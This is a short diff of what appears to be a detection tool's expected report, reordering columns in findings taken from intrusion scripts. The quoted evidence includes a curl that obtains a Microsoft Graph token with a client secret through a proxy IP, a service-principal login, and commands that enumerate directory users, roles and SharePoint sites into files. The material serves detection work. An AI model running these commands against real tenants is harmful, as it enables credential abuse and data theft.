@@ -114,15 +114,15 @@ Targeted   (hardcoded values: prior means no earlier output holds it, discovered
         what  TokenRequest: curl -s -x http://144.172.64.128:8080 -d "client_id=$APP" -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" -d "client_secret=$SECRET" "https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)
               TokenRequest: az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" (20261015_090000_step01_token.sh:8)
   Resource (5)
-    [i] /users              GraphDirectoryEnumeration
+    [i] GraphDirectoryEnumeration  /users
         what  GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/users?`$top=999" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)
-    [i] /servicePrincipals  GraphDirectoryEnumeration
+    [i] GraphDirectoryEnumeration  /servicePrincipals
         what  GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999" (20261015_090500_step02_recon.ps1:3)
-    [i] /directoryRoles     GraphDirectoryEnumeration
+    [i] GraphDirectoryEnumeration  /directoryRoles
         what  GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/directoryRoles" (20261015_090500_step02_recon.ps1:4)
-    [!] /sites              SharePointEnumeration
+    [!] SharePointEnumeration      /sites
         what  SharePointEnumeration: sites = requests.get("https://graph.microsoft.com/v1.0/sites?search=*", headers=headers) (20261015_092000_step04_collect.py:10)
-    [!] /sites/root/drives  SharePointEnumeration
+    [!] SharePointEnumeration      /sites/root/drives
         what  SharePointEnumeration: drive = requests.get("https://graph.microsoft.com/v1.0/sites/root/drives", headers=headers) (20261015_092000_step04_collect.py:11)
   Command (2)
     [i] Get-MgApplication  GraphDirectoryEnumeration
